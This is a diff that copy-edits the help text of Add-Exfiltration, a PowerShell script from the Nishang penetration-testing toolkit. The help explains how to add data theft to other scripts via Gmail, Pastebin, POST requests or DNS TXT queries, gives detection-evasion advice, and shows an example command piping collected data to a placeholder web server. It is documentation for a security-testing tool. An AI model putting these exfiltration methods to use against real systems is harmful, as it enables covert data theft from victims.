@@ -7,42 +7,41 @@ function Add-Exfiltration
 Use this script to exfiltrate data from a target.
 
 .DESCRIPTION
-This script could be used to exfiltrate data from a target to gmail, pastebin, a webserver which could log POST requests
-and a DNS Server which could log TXT queries. To decode the data exfiltrated by webserver and DNS methods use Invoke-Decode.ps1 
-in Utility folder of Nishang.
+This script can be used to exfiltrate data from a target to Gmail, Pastebin, a web server which can log POST requests,
+or a DNS server which can log TXT queries. To decode the data exfiltrated by the web server and DNS methods, use Invoke-Decode.ps1 
+in the utility folder of Nishang.
 
 .PARAMETER ScriptPath
 The path to the script to which exfiltration is to be added.
 
 .PARAMETER FilePath
-The path to the output script with exfiltration added to 
+The path to the output script with added exfiltration.
 
 .PARAMETER ExfilOption
-The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".
+The method you want to use for exfitration of data. Valid options are "gmail", "pastebin", "WebServer", or "DNS".
 
 .PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for other options
+The unique API key provided by Pastebin when you register for a free account.
+Unused for other options,
 
 .PARAMETER username
-Username for the pastebin/gmail account where data would be exfiltrated.
-Unused for other options
+Username for the Pastebin or Gmail account where data would be exfiltrated.
+Unused for other options.
 
 .PARAMETER password
-Password for the pastebin/gmail account where data would be exfiltrated.
-Unused for other options
+Password for the Pastebin or Gmail account where data would be exfiltrated.
+Unused for other options.
 
 .PARAMETER URL
-The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
-The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.
+The URL of the web server where POST requests would be sent. The web server must be able to log the POST requests.
+The encoded values from the web server can be decoded by using Invoke-Decode from Nishang.
 
 .PARAMETER DomainName
-The DomainName, whose subdomains would be used for sending TXT queries to. The DNS Server must log the TXT queries.
+The domain name, whose subdomains should be sent TXT queries. The DNS Server must log the TXT queries.
 
 .PARAMETER AuthNS
-Authoritative Name Server for the domain specified in DomainName. Using it may increase chances of detection.
-Usually, you should let the Name Server of target to resolve things for you.
-
+Authoritative name server for the domain specified in "DomainName." Using it may increase the chance of detection.
+Usually, you should let the name of target to resolve things for you.
 
 .EXAMPLE
 PS > Add-Exfiltration -ScriptPath C:\Get-Information.ps1 -FilePath C:\test\Get-Information_exfil.ps1
@@ -53,11 +52,11 @@ PS > Get-Information | Do-Exfiltration -ExfilOption webserver -URL http://yourwe
 
 The first command adds exfiltration to Get-Information.ps1 and writes it to Get-Information_exfil.ps1
 
-The second command loads the generated Get-Information_exfil.ps1.
+The second command loads the generated Get-Information_exfil.ps1
 
 The third command runs the Get-Information function and pipes its output to the Do-Exfiltration function.
 
-See the help of Do-Exfiltraion.ps1 to understand varios options for exfiltration.
+See the help of Do-Exfiltraion.ps1 to understand various options for exfiltration.
 
 .LINK
 http://labofapenetrationtester.com/
